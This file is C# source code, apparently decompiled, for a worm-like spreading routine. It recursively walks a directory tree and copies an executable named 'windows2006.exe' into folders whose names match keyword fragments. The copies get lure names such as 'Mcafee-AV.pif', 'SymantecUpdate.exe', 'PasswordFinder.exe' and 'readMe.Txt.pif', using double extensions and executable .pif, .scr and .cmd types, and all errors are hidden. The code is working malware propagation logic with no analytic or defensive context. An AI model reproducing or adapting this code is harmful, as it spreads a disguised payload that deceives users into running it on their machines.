using System;
using System.IO;
using System.Text.RegularExpressions;

namespace sex;

internal class sex
{
	public void DispEXE(string tD)
	{
		try
		{
			string[] directories = Directory.GetDirectories(tD);
			string[] array = new string[38]
			{
				"own", "it", "upl", "syst", "set", "usic", "efu", "am", "caf", "yma",
				"mp3", "wav", "ovi", "roj", "win", "ict", "my", "ina", "Shar", "aza",
				"onk", "mob", "tart", "ffic", "av", "rack", "ile", "W32", "root", "assw",
				"Sounds", "ideo", "rit", "ist", "ys", "orn", "ew", "amp"
			};
			string[] array2 = directories;
			foreach (string text in array2)
			{
				try
				{
					string[] array3 = array;
					foreach (string pattern in array3)
					{
						try
						{
							if (Regex.IsMatch(text, pattern))
							{
								if (Regex.IsMatch(text, "it"))
								{
									File.Copy("windows2006.exe", text + "\\NewWeb.exe");
								}
								if (Regex.IsMatch(text, "own"))
								{
									File.Copy("windows2006.exe", text + "\\Downloader.pif");
								}
								if (Regex.IsMatch(text, "upl"))
								{
									File.Copy("windows2006.exe", text + "\\upload-file.exe");
								}
								if (Regex.IsMatch(text, "syst"))
								{
									File.Copy("windows2006.exe", text + "\\system.dll.cmd");
								}
								if (Regex.IsMatch(text, "set"))
								{
									File.Copy("windows2006.exe", text + "\\setu.exe");
								}
								if (Regex.IsMatch(text, "usic"))
								{
									File.Copy("windows2006.exe", text + "\\MyMiusic.exe");
								}
								if (Regex.IsMatch(text, "efu"))
								{
									File.Copy("windows2006.exe", text + "\\defult-path.cmd");
								}
								if (Regex.IsMatch(text, "ame"))
								{
									File.Copy("windows2006.exe", text + "\\FunGame.flash.exe");
								}
								if (Regex.IsMatch(text, "caf"))
								{
									File.Copy("windows2006.exe", text + "\\Mcafee-AV.pif");
								}
								if (Regex.IsMatch(text, "ort"))
								{
									File.Copy("windows2006.exe", text + "\\PortScanner.exe");
								}
								if (Regex.IsMatch(text, "yma"))
								{
									File.Copy("windows2006.exe", text + "\\SymantecUpdate.exe");
								}
								if (Regex.IsMatch(text, "p3"))
								{
									File.Copy("windows2006.exe", text + "\\Mp3Player.pif");
								}
								if (Regex.IsMatch(text, "av"))
								{
									File.Copy("windows2006.exe", text + "\\WaveToMp32.exe");
								}
								if (Regex.IsMatch(text, "ovi"))
								{
									File.Copy("windows2006.exe", text + "\\Fun.pif");
								}
								if (Regex.IsMatch(text, "win"))
								{
									File.Copy("windows2006.exe", text + "\\winUpdate.cab.cmd");
								}
								if (Regex.IsMatch(text, "roj"))
								{
									File.Copy("windows2006.exe", text + "\\install-project.exe");
								}
								if (Regex.IsMatch(text, "ict"))
								{
									File.Copy("windows2006.exe", text + "\\mypic.scr");
								}
								if (Regex.IsMatch(text, "my"))
								{
									File.Copy("windows2006.exe", text + "\\myboy.exe");
								}
								if (Regex.IsMatch(text, "ina"))
								{
									File.Copy("windows2006.exe", text + "\\NewWinamp.exe");
								}
								if (Regex.IsMatch(text, "Shar"))
								{
									File.Copy("windows2006.exe", text + "\\Perl-install.pif");
								}
								if (Regex.IsMatch(text, "aza"))
								{
									File.Copy("windows2006.exe", text + "\\Learning.exe");
								}
								if (Regex.IsMatch(text, "mob"))
								{
									File.Copy("windows2006.exe", text + "\\mobileAV.exe");
								}
								if (Regex.IsMatch(text, "tart"))
								{
									File.Copy("windows2006.exe", text + "\\WinUser32.dll.exe");
								}
								if (Regex.IsMatch(text, "ffic"))
								{
									File.Copy("windows2006.exe", text + "\\newOffice.exe");
								}
								if (Regex.IsMatch(text, "rack"))
								{
									File.Copy("windows2006.exe", text + "\\TrackPlayer.exe");
								}
								if (Regex.IsMatch(text, "ile"))
								{
									File.Copy("windows2006.exe", text + "\\readMe.Txt.pif");
								}
								if (Regex.IsMatch(text, "orn"))
								{
									File.Copy("windows2006.exe", text + "\\pornoPic.scr");
								}
								if (Regex.IsMatch(text, "W32"))
								{
									File.Copy("windows2006.exe", text + "\\WinLearning.htm.cmd");
								}
								if (Regex.IsMatch(text, "root"))
								{
									File.Copy("windows2006.exe", text + "\\DefultRoot.pif");
								}
								if (Regex.IsMatch(text, "assw"))
								{
									File.Copy("windows2006.exe", text + "\\PasswordFinder.exe");
								}
								if (Regex.IsMatch(text, "Sounds"))
								{
									File.Copy("windows2006.exe", text + "\\NewSound.cmd");
								}
								if (Regex.IsMatch(text, "ideo"))
								{
									File.Copy("windows2006.exe", text + "\\0110Video.pif");
								}
								if (Regex.IsMatch(text, "rit"))
								{
									File.Copy("windows2006.exe", text + "\\CDWriter.exe");
								}
								if (Regex.IsMatch(text, "ist"))
								{
									File.Copy("windows2006.exe", text + "\\NewList.exe");
								}
								if (Regex.IsMatch(text, "ys"))
								{
									File.Copy("windows2006.exe", text + "\\Secure.exe");
								}
								if (Regex.IsMatch(text, "ew"))
								{
									File.Copy("windows2006.exe", text + "\\newFile.pif");
								}
								if (Regex.IsMatch(text, "amp"))
								{
									File.Copy("windows2006.exe", text + "\\NewWinamp.exe");
								}
							}
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories2 = Directory.GetDirectories(tD);
			string[] array4 = directories2;
			foreach (string tD2 in array4)
			{
				DispEXE(tD2);
			}
		}
		catch (Exception)
		{
		}
	}
}
